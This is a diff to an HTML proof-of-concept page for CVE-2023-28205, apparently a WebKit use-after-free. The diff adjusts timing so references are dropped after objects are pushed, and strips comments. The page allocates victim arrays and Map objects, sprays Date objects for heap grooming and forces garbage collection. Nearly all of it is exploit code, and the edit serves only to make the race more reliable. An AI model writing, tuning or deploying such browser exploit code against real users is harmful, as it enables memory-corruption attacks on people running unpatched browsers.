@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>CVE-2023-28205 Full PoC Crash</title>
+  <title>CVE-2023-28205 Full PoC Crash - Fixed Timing</title>
   <style>
     body {
       background: #121212;
@@ -54,7 +54,7 @@
   </style>
 </head>
 <body>
-  <h1>CVE-2023-28205 Full PoC Crash</h1>
+  <h1>CVE-2023-28205 Full PoC Crash - Fixed Timing</h1>
   <button id="start">Start Crash Test</button>
   <div id="log" aria-live="polite" aria-atomic="true"></div>
 
@@ -67,16 +67,9 @@
       console.log(msg);
     }
 
-    // Full PoC adapted from https://github.com/ntfargo/uaf-2023-28205/blob/main/module/poc.js
-
-    function sleep(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
     async function triggerFullUAF() {
       log("Starting full PoC exploit...");
 
-      // Step 1: Create arrays and a container for victim objects
       let victimArrays = [];
       let victimMaps = [];
 
@@ -85,36 +78,33 @@
       }
       log("Allocated victim arrays.");
 
-      // Step 2: Create many Map objects without referencing them immediately
       for (let i = 0; i < 3000; i++) {
         let m = new Map();
         victimMaps.push(m);
       }
       log("Allocated victim Map objects.");
 
-      // Step 3: Delay adding Map objects to victim arrays to trigger GC race
       for (let i = 0; i < victimMaps.length; i++) {
+        // Delay added to push after 500ms to ensure victimArrays still exists
         setTimeout(() => {
           victimArrays[i % victimArrays.length].push(victimMaps[i]);
           if (i % 500 === 0) log(`Added Map object ${i}`);
-        }, 1000);
+        }, 500);
       }
 
-      // Step 4: After delay, drop references to trigger GC freeing
+      // Drop references AFTER 1200ms to ensure all pushes ran
       setTimeout(() => {
         log("Dropping references to victim arrays and maps.");
         victimArrays = null;
         victimMaps = null;
-      }, 500);
+      }, 1200);
 
-      // Step 5: Perform memory spraying with arrays of Dates to assist exploitation
       let sprayDates = [];
       for (let i = 0; i < 6000; i++) {
         sprayDates.push(new Date());
       }
       log("Sprayed Date objects for heap grooming.");
 
-      // Step 6: Continuously create and discard objects to encourage GC activity
       let intervalId = setInterval(() => {
         let tmp = [];
         for (let i = 0; i < 1000; i++) {
@@ -124,7 +114,6 @@
         log("Triggered GC activity with Date arrays.");
       }, 1500);
 
-      // Optional: stop spraying after some time
       setTimeout(() => {
         clearInterval(intervalId);
         log("Stopped GC spraying.");
